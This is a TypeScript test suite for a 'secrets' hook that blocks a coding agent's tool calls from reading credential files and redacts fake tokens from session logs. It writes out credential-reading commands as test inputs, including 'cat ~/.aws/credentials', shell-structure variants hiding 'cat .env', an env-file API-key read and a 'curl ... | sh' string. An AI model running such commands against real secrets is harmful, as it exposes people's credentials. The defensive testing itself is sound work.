import { expect, test, describe } from 'claude-code/testing'
import type { Args, EventResult, Frozen } from 'claude-code'
import type { UltraApi } from '../hooks/core/api'
import { createDispatcher } from '../hooks/core/dispatcher'
import type { ModEvent, ModNext } from '../hooks/core/mod'
import { resolveSet } from '../hooks/core/sets'
import { secrets } from '../hooks/mods/secrets'

const enabled = { enabled: async () => true }

// A typed facade fixture: every method the mod may call, captured.
interface World {
  $: UltraApi
  state: Map<string, unknown>
  asked: { question: string; header?: string }[]
  askAnswer: () => string
  logs: string[]
}

function world(init: { set?: unknown; allow?: unknown } = {}): World {
  const values = new Map<string, unknown>([
    ['set', init.set ?? null],
    ['allow', init.allow ?? { risks: [], paths: [] }],
  ])
  const versions = new Map<string, number>([['set', 1], ['allow', 1]])
  const w: World = {
    state: values,
    asked: [],
    askAnswer: () => 'Allow',
    logs: [],
    $: null as unknown as UltraApi,
  }
  w.$ = {
    state: {
      get: async (ref: { key: string }) => ({ value: values.get(ref.key), version: versions.get(ref.key) ?? 0 }),
      set: async (ref: { key: string }, value: unknown, options?: { ifVersion?: number }) => {
        const version = versions.get(ref.key) ?? 0
        if (options?.ifVersion !== undefined && options.ifVersion !== version) return { isSet: false, version }
        values.set(ref.key, value)
        versions.set(ref.key, version + 1)
        return { isSet: true, version: version + 1 }
      },
    },
    ui: {
      ask: async (question: string, options?: { header?: string }) => {
        w.asked.push({ question, header: options?.header })
        return w.askAnswer()
      },
      toast: () => undefined,
      status: () => undefined,
      log: (text: string) => { w.logs.push(text) },
      invalidate: () => undefined,
      open: async () => undefined,
      close: async () => undefined,
      resolve: () => { throw new Error('not needed') },
    },
    session: { root: async () => '/work/project', cwd: async () => '/work/project', id: async () => 's1', usage: async () => ({ startedAt: 0, context: { tokens: 0, window: 200000, percent: 1 }, rateLimits: [], cost: { usd: 0 } }), model: async () => 'claude-haiku-4.5', version: async () => ({ version: '2.1.292', base: '2.1.292', builtAt: '' }), compact: async () => ({}) },
    process: { run: async () => ({ exitCode: 0, stdout: '', stderr: '', isStdoutTruncated: false, isStderrTruncated: false }) },
    fs: { read: async () => '', write: async () => undefined, stat: async () => { throw new Error('missing') }, exists: async () => false },
    store: { get: async () => undefined, set: async () => undefined, delete: async () => undefined, keys: async () => [] },
    clock: { now: async () => 0, every: () => ({ cancel: () => undefined }), after: () => ({ cancel: () => undefined }) },
    audio: { play: async () => undefined },
    command: { register: async () => ({ value: { command: 'ultra' } }) },
    env: { get: async () => undefined },
  } as unknown as UltraApi
  return w
}

function bottom<E extends ModEvent>(event: E, answer: EventResult<E>, calls: { count: number }): ModNext<E> {
  const next = Object.assign(async (_e: Frozen<Args<E>> | Args<E>) => {
    calls.count += 1
    return answer
  }, { event, signal: undefined })
  Object.defineProperty(next, 'called', { get: () => calls.count > 0 })
  return next as unknown as ModNext<E>
}

function call(w: World, e: Args<'tool.call'>): Promise<EventResult<'tool.call'>> {
  const dispatcher = createDispatcher([secrets], enabled)
  const calls = { count: 0 }
  return dispatcher.dispatch(w.$, 'tool.call', e, bottom('tool.call', { result: 'ran', text: 'ran', isReadOnly: true }, calls))
}

const read = (file_path: string) => ({ tool: 'Read', file_path }) as unknown as Args<'tool.call'>
const edit = (file_path: string) => ({ tool: 'Edit', file_path, old_string: 'a', new_string: 'b' }) as unknown as Args<'tool.call'>
const write = (file_path: string) => ({ tool: 'Write', file_path, content: 'x' }) as unknown as Args<'tool.call'>
const bash = (command: string) => ({ tool: 'Bash', command }) as unknown as Args<'tool.call'>
const grep = (path: string) => ({ tool: 'Grep', pattern: 'token', path }) as unknown as Args<'tool.call'>

describe('secrets denies reads of secret paths', () => {
  test('Read of .env denies with guidance', async () => {
    const answer = await call(world(), read('.env'))
    expect(answer).toMatchObject({ deny: expect.stringContaining('.env.example') })
  })

  test('Read of .env.local denies', async () => {
    const answer = await call(world(), read('.env.local'))
    expect(answer).toMatchObject({ deny: expect.any(String) })
  })

  test('Edit of a private key denies', async () => {
    expect(await call(world(), edit('server.key'))).toMatchObject({ deny: expect.any(String) })
  })

  test('Write of .npmrc denies', async () => {
    expect(await call(world(), write('.npmrc'))).toMatchObject({ deny: expect.any(String) })
  })

  test('Grep with a secret path denies', async () => {
    expect(await call(world(), grep('.env'))).toMatchObject({ deny: expect.any(String) })
  })

  test('Bash cat .env denies', async () => {
    expect(await call(world(), bash('cat .env'))).toMatchObject({ deny: expect.stringContaining('.env') })
  })

  test('the deny text names the path and the way out', async () => {
    const answer = await call(world(), bash('cat ~/.aws/credentials'))
    const deny = (answer as { deny: string }).deny
    expect(deny).toContain('~/.aws/credentials')
    expect(deny).toContain('/ultra allow')
  })
})

describe('secrets passes look-alikes through', () => {
  test('README and example files pass', async () => {
    const w = world()
    for (const e of [read('README.md'), read('.env.example'), read('package.json')]) {
      expect(await call(w, e)).toMatchObject({ result: 'ran' })
    }
  })

  test('non-secret bash commands pass', async () => {
    const w = world()
    for (const command of ['cat README.md', 'source .env', 'echo $TOKEN', 'ls -la', 'cat .env.example']) {
      expect(await call(w, bash(command))).toMatchObject({ result: 'ran' })
    }
  })

  test('ordinary edits pass', async () => {
    expect(await call(world(), edit('src/main.ts'))).toMatchObject({ result: 'ran' })
  })

  test('bare env is allowed in essentials', async () => {
    expect(await call(world(), bash('env'))).toMatchObject({ result: 'ran' })
  })

  test('printenv with an argument passes even in strict', async () => {
    const w = world({ set: resolveSet({ set: 'strict' }) })
    expect(await call(w, bash('printenv HOME'))).toMatchObject({ result: 'ran' })
  })

  test('Grep over source folders passes', async () => {
    expect(await call(world(), grep('src'))).toMatchObject({ result: 'ran' })
  })
})

describe('secrets strict mode and allowlist', () => {
  test('bare env denies in strict', async () => {
    const w = world({ set: resolveSet({ set: 'strict' }) })
    expect(await call(w, bash('env'))).toMatchObject({ deny: expect.stringContaining('environment') })
  })

  test('an allowed path passes', async () => {
    const w = world({ allow: { risks: [], paths: ['.env'] } })
    expect(await call(w, read('.env'))).toMatchObject({ result: 'ran' })
    expect(await call(w, bash('cat .env'))).toMatchObject({ result: 'ran' })
  })

  test('a state failure still denies secret reads (fail closed)', async () => {
    const w = world()
    ;(w.$ as unknown as { state: { get: () => Promise<unknown> } }).state = {
      get: async () => { throw new Error('state unavailable') },
    }
    expect(await call(w, read('.env'))).toMatchObject({ deny: expect.any(String) })
    expect(await call(w, read('README.md'))).toMatchObject({ result: 'ran' })
  })
})

describe('secrets allow subcommand', () => {
  test('a path argument is allowed for the session', async () => {
    const w = world()
    const answer = await secrets.commands?.allow?.(w.$, '.env')
    expect(answer).toMatchObject({ text: expect.stringContaining('.env') })
    expect(await call(w, read('.env'))).toMatchObject({ result: 'ran' })
  })

  test('allowing the same path twice keeps one entry (C43)', async () => {
    const w = world()
    await secrets.commands?.allow?.(w.$, '.env')
    await secrets.commands?.allow?.(w.$, '.env')
    expect(w.state.get('allow')).toEqual({ risks: [], paths: ['.env'] })
  })

  test('a non-path argument defers to guard', async () => {
    const answer = await secrets.commands?.allow?.(world().$, 'git-reset-hard')
    expect(answer).toBe(null)
  })

  test('a known secret basename counts as a path', async () => {
    expect(await secrets.commands?.allow?.(world().$, 'id_rsa')).toMatchObject({ text: expect.any(String) })
  })
})

describe('secrets redacts stored rows', () => {
  function appendMessage(text: string, door: Args<'session.append'>['door'] = 'tool-result'): Args<'session.append'> {
    const content: Args<'session.append'>['message']['content'] = door === 'prompt' || door === 'response'
      ? [{ type: 'text', text }]
      : [{ type: 'tool_result', tool_use_id: 't1', content: [{ type: 'text', text }] }]
    return {
      message: { type: 'user', content },
      door,
      origin: { kind: 'tool', tool: 'Bash' },
      uuid: 'row-1',
    }
  }

  test('a token in a tool result is replaced and logged', async () => {
    const w = world()
    const dispatcher = createDispatcher([secrets], enabled)
    const calls = { count: 0 }
    // Split so secret scanners reading this repo do not flag the fake token.
    const e = appendMessage('token ghp' + '_AbCdEf0123456789AbCdEf0123456789AbCdEf0123 end')
    const echo = echoNext(calls)
    const answer = (await dispatcher.dispatch(w.$, 'session.append', e, echo)) as { message: typeof e.message }
    const block = answer.message.content[0] as unknown as { content: { type: string; text: string }[] }
    expect(block.content[0]?.text).toBe('token [redacted:github] end')
    expect(w.logs).toEqual(['secrets: redacted 1 github'])
    expect(calls.count).toBe(1)
  })

  test('the person prompt and the reply are stored as typed', async () => {
    const w = world()
    const dispatcher = createDispatcher([secrets], enabled)
    const calls = { count: 0 }
    const text = 'token ghp' + '_AbCdEf0123456789AbCdEf0123456789AbCdEf0123 end'
    for (const door of ['prompt', 'response'] as const) {
      const e = appendMessage(text, door)
      const answer = await dispatcher.dispatch(w.$, 'session.append', e, echoNext(calls))
      expect(answer).toEqual({ message: e.message, uuid: 'row-1' })
    }
    expect(w.logs).toEqual([])
    expect(calls.count).toBe(2)
  })

  test('a tool message row is redacted like a tool result', async () => {
    const w = world()
    const dispatcher = createDispatcher([secrets], enabled)
    const calls = { count: 0 }
    const e = appendMessage('token ghp' + '_AbCdEf0123456789AbCdEf0123456789AbCdEf0123 end', 'tool-message')
    const answer = (await dispatcher.dispatch(w.$, 'session.append', e, echoNext(calls))) as { message: typeof e.message }
    const block = answer.message.content[0] as unknown as { content: { type: string; text: string }[] }
    expect(block.content[0]?.text).toBe('token [redacted:github] end')
    expect(w.logs).toEqual(['secrets: redacted 1 github'])
  })

  test('clean rows are unchanged with no log', async () => {
    const w = world()
    const dispatcher = createDispatcher([secrets], enabled)
    const calls = { count: 0 }
    const e = appendMessage('ordinary output with no secrets')
    const answer = await dispatcher.dispatch(w.$, 'session.append', e, bottom('session.append', { message: e.message, uuid: e.uuid }, calls))
    expect(answer).toEqual({ message: e.message, uuid: 'row-1' })
    expect(w.logs).toEqual([])
  })

  function echoNext(calls: { count: number }): ModNext<'session.append'> {
    const next = Object.assign(async (input: Frozen<Args<'session.append'>> | Args<'session.append'>) => {
      calls.count += 1
      return { message: input.message, uuid: input.uuid } as EventResult<'session.append'>
    }, { event: 'session.append' as const, signal: undefined })
    Object.defineProperty(next, 'called', { get: () => calls.count > 0 })
    return next as unknown as ModNext<'session.append'>
  }

  test('a failed log line keeps the row', async () => {
    const w = world()
    ;(w.$ as unknown as { ui: { log: (text: string) => void } }).ui.log = () => { throw new Error('log failed') }
    const dispatcher = createDispatcher([secrets], enabled)
    const calls = { count: 0 }
    const e = appendMessage('key sk-' + 'ant-api03-AbCdEf0123456789AbCdEf0123456789AbCdEf01')
    const answer = (await dispatcher.dispatch(w.$, 'session.append', e, echoNext(calls))) as { message: typeof e.message }
    const block = answer.message.content[0] as unknown as { content: { type: string; text: string }[] }
    expect(block.content[0]?.text).toContain('[redacted:anthropic]')
    expect(calls.count).toBe(1)
  })

  test('a redactor failure keeps the original row (fail open)', async () => {
    const dispatcher = createDispatcher([{ id: 'secrets', hooks: { 'session.append': [{ run: () => { throw new Error('redactor crashed') } }] } }], enabled)
    const calls = { count: 0 }
    const e = appendMessage('original')
    const answer = await dispatcher.dispatch(world().$, 'session.append', e, bottom('session.append', { message: e.message, uuid: e.uuid }, calls))
    expect(answer).toEqual({ message: e.message, uuid: 'row-1' })
    expect(calls.count).toBe(1)
  })
})

describe('secrets allow accepts paths with spaces (C09)', () => {
  test('an absolute path with a space is allowed and then passes', async () => {
    const w = world()
    const path = '/workspace/My Project/.env'
    expect(await secrets.commands?.allow?.(w.$, path)).toMatchObject({ text: expect.stringContaining(path) })
    expect(await call(w, read(path))).toMatchObject({ result: 'ran' })
    expect(await call(w, bash(`cat "${path}"`))).toMatchObject({ result: 'ran' })
  })

  test('home, dot and relative secret paths with spaces are accepted', async () => {
    for (const path of ['~/My Keys/id_rsa', './my project/.env', 'My Project/.env', 'C:\\Users\\Me\\My Project\\.env']) {
      expect(await secrets.commands?.allow?.(world().$, path), path).toMatchObject({ text: expect.any(String) })
    }
  })

  test('surrounding quotes are dropped', async () => {
    const w = world()
    await secrets.commands?.allow?.(w.$, '"/workspace/My Project/.env"')
    expect(w.state.get('allow')).toEqual({ risks: [], paths: ['/workspace/My Project/.env'] })
  })

  test('a spaced phrase that is not a path still defers to guard', async () => {
    for (const text of ['rm -rf /tmp/x', 'git reset hard', 'some words here']) {
      expect(await secrets.commands?.allow?.(world().$, text), text).toBe(null)
    }
  })
})

describe('secrets Bash decision uses the allowlist matching (C10)', () => {
  test('a basename entry allows cat of the same file in another folder', async () => {
    const w = world({ allow: { risks: [], paths: ['.env'] } })
    expect(await call(w, read('/work/.env'))).toMatchObject({ result: 'ran' })
    expect(await call(w, bash('cat /work/.env'))).toMatchObject({ result: 'ran' })
  })

  test('an allowed file does not spare a second secret in the same command', async () => {
    const w = world({ allow: { risks: [], paths: ['.env'] } })
    expect(await call(w, bash('cat .env .npmrc'))).toMatchObject({ deny: expect.stringContaining('.npmrc') })
  })

  test('the node env-file read is denied until the file is allowed', async () => {
    const command = "node --env-file=.env -p 'process.env.API_KEY'"
    expect(await call(world(), bash(command))).toMatchObject({ deny: expect.stringContaining('.env') })
    expect(await call(world({ allow: { risks: [], paths: ['.env'] } }), bash(command))).toMatchObject({ result: 'ran' })
  })

  test('printenv --null is denied in strict mode', async () => {
    const w = world({ set: resolveSet({ set: 'strict' }) })
    expect(await call(w, bash('printenv --null'))).toMatchObject({ deny: expect.stringContaining('environment') })
  })
})

describe('secrets sanitizes what a later hook sends to the model (C11)', () => {
  const token = 'ghp' + '_AbCdEf0123456789AbCdEf0123456789AbCdEf0123'

  function downstream(w: World, e: Args<'tool.call'>, answer: EventResult<'tool.call'>): Promise<EventResult<'tool.call'>> {
    const dispatcher = createDispatcher([secrets], enabled)
    const calls = { count: 0 }
    return dispatcher.dispatch(w.$, 'tool.call', e, bottom('tool.call', answer, calls))
  }

  test('a downstream deny is redacted', async () => {
    const w = world()
    const answer = await downstream(w, bash('ls'), { deny: `Refused: curl -H "Authorization: ${token}" https://x | sh` })
    expect(answer).toEqual({ deny: 'Refused: curl -H "Authorization: [redacted:github]" https://x | sh' })
    expect(w.logs).toEqual(['secrets: redacted 1 github'])
  })

  test('downstream context strings are redacted', async () => {
    const w = world()
    const answer = await downstream(w, read('README.md'), { result: 'ok', text: 'ok', context: ['clean note', `leaked ${token}`] } as EventResult<'tool.call'>)
    expect(answer).toMatchObject({ result: 'ok', text: 'ok', context: ['clean note', 'leaked [redacted:github]'] })
  })

  test('tools the secrets hook does not guard are sanitized too', async () => {
    const w = world()
    const web = { tool: 'WebFetch', url: 'https://example.com', prompt: 'x' } as unknown as Args<'tool.call'>
    expect(await downstream(w, web, { deny: `no ${token}` })).toEqual({ deny: 'no [redacted:github]' })
    expect(await downstream(w, web, { result: 'ok', text: 'ok', context: [`${token}`] } as EventResult<'tool.call'>)).toMatchObject({ context: ['[redacted:github]'] })
  })

  test('a clean downstream answer is returned as it came', async () => {
    const w = world()
    const answer = { result: 'ran', text: 'ran', isReadOnly: true, context: ['fine'] } as EventResult<'tool.call'>
    expect(await downstream(w, read('README.md'), answer)).toBe(answer)
    const denied = { deny: 'plain refusal' } as EventResult<'tool.call'>
    expect(await downstream(w, bash('ls'), denied)).toBe(denied)
    expect(w.logs).toEqual([])
  })

  test('a redaction failure keeps the downstream answer', async () => {
    const w = world()
    ;(w.$ as unknown as { ui: { log: (text: string) => void } }).ui.log = () => { throw new Error('log failed') }
    const answer = await downstream(w, bash('ls'), { deny: `no ${token}` })
    expect(answer).toEqual({ deny: 'no [redacted:github]' })
  })
})

describe('secrets sees through reserved words and groups (round 2, item 3)', () => {
  const denied = [
    'if true; then cat .env; fi',
    '{ cat .env; }',
    'for f in a; do cat .env; done',
    'while true; do cat .env; break; done',
    '! cat .env',
    'echo a && { cat .env; }',
    'f() { cat .env; }; f',
    'case x in x) cat .env;; esac',
    'cat <<\\EOF\nx\nEOF\ncat .env',
    'echo `echo "it\'s"`; cat .env',
  ]
  for (const command of denied) {
    test(`denies ${JSON.stringify(command)}`, async () => {
      expect(await call(world(), bash(command))).toMatchObject({ deny: expect.stringContaining('.env') })
    })
  }

  test('look-alikes with the same keywords pass', async () => {
    const w = world()
    for (const command of ['if true; then cat README.md; fi', '{ cat .env.example; }', 'echo then cat .env', 'for f in a; do ls; done']) {
      expect(await call(w, bash(command))).toMatchObject({ result: 'ran' })
    }
  })
})
